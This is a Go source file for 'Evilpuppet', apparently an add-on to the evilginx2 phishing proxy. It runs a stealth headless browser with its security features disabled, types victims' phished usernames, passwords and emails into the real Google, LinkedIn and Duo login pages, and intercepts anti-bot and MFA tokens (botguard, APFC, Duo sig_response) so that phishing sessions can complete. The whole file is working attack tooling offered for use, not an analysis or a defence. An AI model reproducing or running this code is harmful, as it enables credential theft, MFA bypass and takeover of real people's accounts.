package core

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/go-rod/stealth"
	"github.com/kgretzky/evilginx2/log"
)

// EvilpuppetConfig holds the configuration for Evilpuppet
type EvilpuppetConfig struct {
	Enabled           bool          `json:"enabled"`
	Headless          bool          `json:"headless"`
	DevTools          bool          `json:"devtools"`
	SlowMotionMs      int           `json:"slow_motion_ms"`
	Timeout           time.Duration `json:"timeout"`
	ChromeDebugPort   int           `json:"chrome_debug_port"`
	UseExistingBrowser bool         `json:"use_existing_browser"`
}

// EvilpuppetAction represents an action to perform in the browser
type EvilpuppetAction struct {
	Selector  string `yaml:"selector"`
	Value     string `yaml:"value"`
	Enter     bool   `yaml:"enter"`
	Click     bool   `yaml:"click"`
	PostWait  int    `yaml:"post_wait"` // milliseconds
	WaitFor   string `yaml:"wait_for"`  // wait for element to appear
}

// EvilpuppetInterceptor represents a token interceptor
type EvilpuppetInterceptor struct {
	Token   string `yaml:"token"`
	UrlRe   string `yaml:"url_re"`
	PostRe  string `yaml:"post_re"`
	HeaderRe string `yaml:"header_re"`
	Abort   bool   `yaml:"abort"`
}

// EvilpuppetTrigger represents a trigger for Evilpuppet
type EvilpuppetTrigger struct {
	Domains      []string           `yaml:"domains"`
	Paths        []string           `yaml:"paths"`
	Token        string             `yaml:"token"`
	OpenUrl      string             `yaml:"open_url"`
	Actions      []EvilpuppetAction `yaml:"actions"`
}

// EvilpuppetPhishletConfig holds phishlet-specific Evilpuppet config
type EvilpuppetPhishletConfig struct {
	Triggers     []EvilpuppetTrigger     `yaml:"triggers"`
	Interceptors []EvilpuppetInterceptor `yaml:"interceptors"`
}

// Evilpuppet manages a headless browser for token extraction
type Evilpuppet struct {
	config         *EvilpuppetConfig
	browser        *rod.Browser
	browserLauncher *launcher.Launcher
	mu             sync.Mutex
	isRunning      bool
	tokenCache     map[string]string
	tokenMu        sync.RWMutex
}

// TokenExtractionResult holds the result of token extraction
type TokenExtractionResult struct {
	Token     string
	TokenName string
	Success   bool
	Error     error
}

// SessionContext holds session-specific data for Evilpuppet
type SessionContext struct {
	SessionID  string
	Username   string
	Password   string
	Email      string
	Tokens     map[string]string
	Cookies    []*proto.NetworkCookie
}

var (
	evilpuppetInstance *Evilpuppet
	evilpuppetOnce     sync.Once
)

// NewEvilpuppet creates a new Evilpuppet instance
func NewEvilpuppet(config *EvilpuppetConfig) *Evilpuppet {
	if config == nil {
		config = &EvilpuppetConfig{
			Enabled:         true,
			Headless:        true,
			DevTools:        false,
			SlowMotionMs:    500,
			Timeout:         120 * time.Second,
			ChromeDebugPort: 9222,
			UseExistingBrowser: false,
		}
	}

	return &Evilpuppet{
		config:     config,
		tokenCache: make(map[string]string),
	}
}

// GetEvilpuppet returns the singleton Evilpuppet instance
func GetEvilpuppet() *Evilpuppet {
	evilpuppetOnce.Do(func() {
		evilpuppetInstance = NewEvilpuppet(nil)
	})
	return evilpuppetInstance
}

// Initialize starts the browser
func (ep *Evilpuppet) Initialize() error {
	ep.mu.Lock()
	defer ep.mu.Unlock()

	if ep.isRunning {
		return nil
	}

	var err error

	if ep.config.UseExistingBrowser {
		// Connect to existing browser via remote debugging
		wsURL, wsErr := ep.getWebSocketDebuggerURL()
		if wsErr != nil {
			return fmt.Errorf("failed to get WebSocket debugger URL: %v", wsErr)
		}

		ep.browser = rod.New().ControlURL(wsURL)
		if ep.config.SlowMotionMs > 0 {
			ep.browser = ep.browser.SlowMotion(time.Duration(ep.config.SlowMotionMs) * time.Millisecond)
		}
		if err = ep.browser.Connect(); err != nil {
			return fmt.Errorf("failed to connect to browser: %v", err)
		}
	} else {
		// Launch new browser
		ep.browserLauncher = launcher.New().
			Headless(ep.config.Headless).
			Devtools(ep.config.DevTools).
			NoSandbox(true).
			Set("disable-blink-features", "AutomationControlled").
			Set("disable-features", "IsolateOrigins,site-per-process").
			Set("disable-site-isolation-trials").
			Set("disable-web-security").
			Set("allow-running-insecure-content").
			Set("ignore-certificate-errors")

		u, err := ep.browserLauncher.Launch()
		if err != nil {
			return fmt.Errorf("failed to launch browser: %v", err)
		}

		ep.browser = rod.New().ControlURL(u)
		if ep.config.SlowMotionMs > 0 {
			ep.browser = ep.browser.SlowMotion(time.Duration(ep.config.SlowMotionMs) * time.Millisecond)
		}
		if err = ep.browser.Connect(); err != nil {
			return fmt.Errorf("failed to connect to browser: %v", err)
		}
	}

	ep.isRunning = true
	log.Info("[Evilpuppet] Browser initialized successfully")
	return nil
}

// Shutdown closes the browser
func (ep *Evilpuppet) Shutdown() {
	ep.mu.Lock()
	defer ep.mu.Unlock()

	if ep.browser != nil {
		ep.browser.Close()
		ep.browser = nil
	}
	if ep.browserLauncher != nil {
		ep.browserLauncher.Cleanup()
		ep.browserLauncher = nil
	}
	ep.isRunning = false
	log.Info("[Evilpuppet] Browser shutdown complete")
}

// getWebSocketDebuggerURL gets the WebSocket URL from a running Chrome instance
func (ep *Evilpuppet) getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get(fmt.Sprintf("http://127.0.0.1:%d/json", ep.config.ChromeDebugPort))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}

	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}

	wsURL, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok {
		return "", fmt.Errorf("webSocketDebuggerUrl not found")
	}

	return wsURL, nil
}

// createStealthPage creates a new stealth page to avoid detection
func (ep *Evilpuppet) createStealthPage() (*rod.Page, error) {
	if ep.browser == nil {
		return nil, fmt.Errorf("browser not initialized")
	}

	page, err := stealth.Page(ep.browser)
	if err != nil {
		return nil, fmt.Errorf("failed to create stealth page: %v", err)
	}

	return page, nil
}

// ExtractGoogleBotguardToken extracts Google botguard token
func (ep *Evilpuppet) ExtractGoogleBotguardToken(ctx context.Context, email string) (*TokenExtractionResult, error) {
	if !ep.isRunning {
		if err := ep.Initialize(); err != nil {
			return nil, err
		}
	}

	result := &TokenExtractionResult{
		TokenName: "botguard",
	}

	page, err := ep.createStealthPage()
	if err != nil {
		result.Error = err
		return result, err
	}
	defer page.Close()

	// Set up request interception
	var capturedToken string
	tokenRegex := regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

	router := page.HijackRequests()
	defer router.Stop()

	router.MustAdd("*", func(ctx *rod.Hijack) {
		// Check if this is the request we're interested in
		if strings.Contains(ctx.Request.URL().String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute") &&
			strings.Contains(ctx.Request.URL().String(), "rpcids=V1UmUe") {
			
			body := ctx.Request.Body()
			decodedBody, _ := url.QueryUnescape(body)
			
			matches := tokenRegex.FindStringSubmatch(decodedBody)
			if len(matches) > 1 {
				capturedToken = matches[0]
				log.Debug("[Evilpuppet] Captured botguard token: %s...", capturedToken[:min(50, len(capturedToken))])
			}
		}
		ctx.ContinueRequest(&proto.FetchContinueRequest{})
	})

	go router.Run()

	// Navigate to Google login
	log.Debug("[Evilpuppet] Navigating to Google login page...")
	err = page.Navigate("https://accounts.google.com/")
	if err != nil {
		result.Error = err
		return result, err
	}

	// Wait for page load
	err = page.WaitLoad()
	if err != nil {
		result.Error = err
		return result, err
	}

	// Find and fill email field
	log.Debug("[Evilpuppet] Entering email: %s", email)
	emailField, err := page.Element("#identifierId")
	if err != nil {
		result.Error = fmt.Errorf("failed to find email field: %v", err)
		return result, result.Error
	}

	err = emailField.Input(email)
	if err != nil {
		result.Error = fmt.Errorf("failed to input email: %v", err)
		return result, result.Error
	}

	// Press Enter to submit
	err = page.Keyboard.Press(input.Enter)
	if err != nil {
		result.Error = fmt.Errorf("failed to submit: %v", err)
		return result, result.Error
	}

	// Wait for token capture with timeout
	timeout := time.After(30 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for capturedToken == "" {
		select {
		case <-ctx.Done():
			result.Error = ctx.Err()
			return result, result.Error
		case <-timeout:
			result.Error = fmt.Errorf("timeout waiting for botguard token")
			return result, result.Error
		case <-ticker.C:
			// Continue waiting
		}
	}

	result.Token = capturedToken
	result.Success = true
	log.Info("[Evilpuppet] Successfully extracted botguard token")
	return result, nil
}

// ExtractLinkedInAPFC extracts LinkedIn APFC token
func (ep *Evilpuppet) ExtractLinkedInAPFC(ctx context.Context, username, password string) (*TokenExtractionResult, error) {
	if !ep.isRunning {
		if err := ep.Initialize(); err != nil {
			return nil, err
		}
	}

	result := &TokenExtractionResult{
		TokenName: "apfc",
	}

	page, err := ep.createStealthPage()
	if err != nil {
		result.Error = err
		return result, err
	}
	defer page.Close()

	var capturedToken string
	apfcRegex := regexp.MustCompile(`apfc=([^&]*)`)

	router := page.HijackRequests()
	defer router.Stop()

	router.MustAdd("*", func(ctx *rod.Hijack) {
		if strings.Contains(ctx.Request.URL().String(), "/checkpoint/lg/login-submit") {
			body := ctx.Request.Body()
			matches := apfcRegex.FindStringSubmatch(body)
			if len(matches) > 1 {
				capturedToken = matches[1]
				log.Debug("[Evilpuppet] Captured APFC token: %s...", capturedToken[:min(50, len(capturedToken))])
			}
		}
		ctx.ContinueRequest(&proto.FetchContinueRequest{})
	})

	go router.Run()

	// Navigate to LinkedIn login
	log.Debug("[Evilpuppet] Navigating to LinkedIn login page...")
	err = page.Navigate("https://www.linkedin.com/login")
	if err != nil {
		result.Error = err
		return result, err
	}

	err = page.WaitLoad()
	if err != nil {
		result.Error = err
		return result, err
	}

	// Fill username
	usernameField, err := page.Element("#username")
	if err != nil {
		result.Error = fmt.Errorf("failed to find username field: %v", err)
		return result, result.Error
	}
	err = usernameField.Input(username)
	if err != nil {
		result.Error = fmt.Errorf("failed to input username: %v", err)
		return result, result.Error
	}

	time.Sleep(500 * time.Millisecond)

	// Fill password
	passwordField, err := page.Element("#password")
	if err != nil {
		result.Error = fmt.Errorf("failed to find password field: %v", err)
		return result, result.Error
	}
	err = passwordField.Input(password)
	if err != nil {
		result.Error = fmt.Errorf("failed to input password: %v", err)
		return result, result.Error
	}

	time.Sleep(500 * time.Millisecond)

	// Click submit button
	submitBtn, err := page.Element("button[type=submit]")
	if err != nil {
		result.Error = fmt.Errorf("failed to find submit button: %v", err)
		return result, result.Error
	}
	err = submitBtn.Click(proto.InputMouseButtonLeft, 1)
	if err != nil {
		result.Error = fmt.Errorf("failed to click submit: %v", err)
		return result, result.Error
	}

	// Wait for token capture
	timeout := time.After(30 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for capturedToken == "" {
		select {
		case <-ctx.Done():
			result.Error = ctx.Err()
			return result, result.Error
		case <-timeout:
			result.Error = fmt.Errorf("timeout waiting for APFC token")
			return result, result.Error
		case <-ticker.C:
		}
	}

	result.Token = capturedToken
	result.Success = true
	log.Info("[Evilpuppet] Successfully extracted APFC token")
	return result, nil
}

// ExtractDuoFrameID extracts Duo iframe session ID
func (ep *Evilpuppet) ExtractDuoFrameID(ctx context.Context, duoHost, sigRequest string) (*TokenExtractionResult, error) {
	if !ep.isRunning {
		if err := ep.Initialize(); err != nil {
			return nil, err
		}
	}

	result := &TokenExtractionResult{
		TokenName: "duo_sig_response",
	}

	page, err := ep.createStealthPage()
	if err != nil {
		result.Error = err
		return result, err
	}
	defer page.Close()

	var capturedSigResponse string

	router := page.HijackRequests()
	defer router.Stop()

	router.MustAdd("*", func(ctx *rod.Hijack) {
		// Look for sig_response in POST data or URL params
		if strings.Contains(ctx.Request.URL().String(), "sig_response=") {
			u := ctx.Request.URL()
			sigResp := u.Query().Get("sig_response")
			if sigResp != "" {
				capturedSigResponse = sigResp
				log.Debug("[Evilpuppet] Captured Duo sig_response from URL")
			}
		}
		
		body := ctx.Request.Body()
		if strings.Contains(body, "sig_response=") {
			params, _ := url.ParseQuery(body)
			if sig := params.Get("sig_response"); sig != "" {
				capturedSigResponse = sig
				log.Debug("[Evilpuppet] Captured Duo sig_response from body")
			}
		}
		
		ctx.ContinueRequest(&proto.FetchContinueRequest{})
	})

	go router.Run()

	// Construct Duo iframe URL
	duoURL := fmt.Sprintf("https://%s/frame/web/v1/auth?tx=%s&parent=", duoHost, sigRequest)
	
	log.Debug("[Evilpuppet] Navigating to Duo frame: %s", duoURL)
	err = page.Navigate(duoURL)
	if err != nil {
		result.Error = err
		return result, err
	}

	// Wait for token capture or timeout
	timeout := time.After(60 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for capturedSigResponse == "" {
		select {
		case <-ctx.Done():
			result.Error = ctx.Err()
			return result, result.Error
		case <-timeout:
			result.Error = fmt.Errorf("timeout waiting for Duo sig_response")
			return result, result.Error
		case <-ticker.C:
		}
	}

	result.Token = capturedSigResponse
	result.Success = true
	log.Info("[Evilpuppet] Successfully extracted Duo sig_response")
	return result, nil
}

// GenericTokenExtraction performs generic token extraction based on phishlet config
func (ep *Evilpuppet) GenericTokenExtraction(ctx context.Context, config *EvilpuppetPhishletConfig, session *SessionContext) (*TokenExtractionResult, error) {
	if !ep.isRunning {
		if err := ep.Initialize(); err != nil {
			return nil, err
		}
	}

	result := &TokenExtractionResult{}

	page, err := ep.createStealthPage()
	if err != nil {
		result.Error = err
		return result, err
	}
	defer page.Close()

	// Set up interceptors
	capturedTokens := make(map[string]string)
	var tokenMu sync.Mutex

	router := page.HijackRequests()
	defer router.Stop()

	for _, interceptor := range config.Interceptors {
		inter := interceptor // capture for closure
		urlRegex := regexp.MustCompile(inter.UrlRe)
		postRegex := regexp.MustCompile(inter.PostRe)

		router.MustAdd("*", func(ctx *rod.Hijack) {
			reqURL := ctx.Request.URL().String()
			if urlRegex.MatchString(reqURL) {
				body := ctx.Request.Body()
				decodedBody, _ := url.QueryUnescape(body)
				
				matches := postRegex.FindStringSubmatch(decodedBody)
				if len(matches) > 1 {
					tokenMu.Lock()
					capturedTokens[inter.Token] = matches[1]
					tokenMu.Unlock()
					log.Debug("[Evilpuppet] Captured token '%s': %s...", inter.Token, matches[1][:min(30, len(matches[1]))])
				}
			}
			
			if inter.Abort {
				ctx.Response.Fail(proto.NetworkErrorReasonAborted)
			} else {
				ctx.ContinueRequest(&proto.FetchContinueRequest{})
			}
		})
	}

	go router.Run()

	// Execute triggers
	for _, trigger := range config.Triggers {
		// Navigate to the URL
		targetURL := trigger.OpenUrl
		targetURL = strings.ReplaceAll(targetURL, "{username}", session.Username)
		targetURL = strings.ReplaceAll(targetURL, "{email}", session.Email)

		log.Debug("[Evilpuppet] Navigating to: %s", targetURL)
		err = page.Navigate(targetURL)
		if err != nil {
			log.Warning("[Evilpuppet] Navigation error: %v", err)
			continue
		}

		err = page.WaitLoad()
		if err != nil {
			log.Warning("[Evilpuppet] Wait load error: %v", err)
		}

		// Execute actions
		for _, action := range trigger.Actions {
			// Replace placeholders in value
			value := action.Value
			value = strings.ReplaceAll(value, "{username}", session.Username)
			value = strings.ReplaceAll(value, "{password}", session.Password)
			value = strings.ReplaceAll(value, "{email}", session.Email)

			// Wait for element if needed
			if action.WaitFor != "" {
				page.MustElement(action.WaitFor)
			}

			// Find element
			elem, err := page.Element(action.Selector)
			if err != nil {
				log.Warning("[Evilpuppet] Element not found: %s", action.Selector)
				continue
			}

			// Input value if provided
			if value != "" {
				err = elem.Input(value)
				if err != nil {
					log.Warning("[Evilpuppet] Input error: %v", err)
				}
			}

			// Click if required
			if action.Click {
				err = elem.Click(proto.InputMouseButtonLeft, 1)
				if err != nil {
					log.Warning("[Evilpuppet] Click error: %v", err)
				}
			}

			// Press Enter if required
			if action.Enter {
				err = page.Keyboard.Press(input.Enter)
				if err != nil {
					log.Warning("[Evilpuppet] Enter key error: %v", err)
				}
			}

			// Post-action wait
			if action.PostWait > 0 {
				time.Sleep(time.Duration(action.PostWait) * time.Millisecond)
			}
		}
	}

	// Wait for token capture
	timeout := time.After(ep.config.Timeout)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			result.Error = ctx.Err()
			return result, result.Error
		case <-timeout:
			// Return whatever we captured
			if len(capturedTokens) > 0 {
				// Return the first token (or combine them)
				for name, token := range capturedTokens {
					result.TokenName = name
					result.Token = token
					result.Success = true
					break
				}
			} else {
				result.Error = fmt.Errorf("timeout: no tokens captured")
			}
			return result, result.Error
		case <-ticker.C:
			tokenMu.Lock()
			if len(capturedTokens) > 0 {
				for name, token := range capturedTokens {
					result.TokenName = name
					result.Token = token
					result.Success = true
					tokenMu.Unlock()
					return result, nil
				}
			}
			tokenMu.Unlock()
		}
	}
}

// ReplaceTokenInBody replaces a token pattern in the body
func (ep *Evilpuppet) ReplaceTokenInBody(body []byte, tokenPattern, newToken string) []byte {
	re := regexp.MustCompile(tokenPattern)
	newBody := re.ReplaceAllString(string(body), newToken)
	return []byte(newBody)
}

// CacheToken stores a token in cache
func (ep *Evilpuppet) CacheToken(sessionID, tokenName, token string) {
	ep.tokenMu.Lock()
	defer ep.tokenMu.Unlock()
	key := fmt.Sprintf("%s:%s", sessionID, tokenName)
	ep.tokenCache[key] = token
}

// GetCachedToken retrieves a cached token
func (ep *Evilpuppet) GetCachedToken(sessionID, tokenName string) (string, bool) {
	ep.tokenMu.RLock()
	defer ep.tokenMu.RUnlock()
	key := fmt.Sprintf("%s:%s", sessionID, tokenName)
	token, ok := ep.tokenCache[key]
	return token, ok
}

// ClearSessionTokens clears tokens for a session
func (ep *Evilpuppet) ClearSessionTokens(sessionID string) {
	ep.tokenMu.Lock()
	defer ep.tokenMu.Unlock()
	for key := range ep.tokenCache {
		if strings.HasPrefix(key, sessionID+":") {
			delete(ep.tokenCache, key)
		}
	}
}

// IsEnabled returns whether Evilpuppet is enabled
func (ep *Evilpuppet) IsEnabled() bool {
	return ep.config.Enabled
}

// SetEnabled enables or disables Evilpuppet
func (ep *Evilpuppet) SetEnabled(enabled bool) {
	ep.config.Enabled = enabled
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
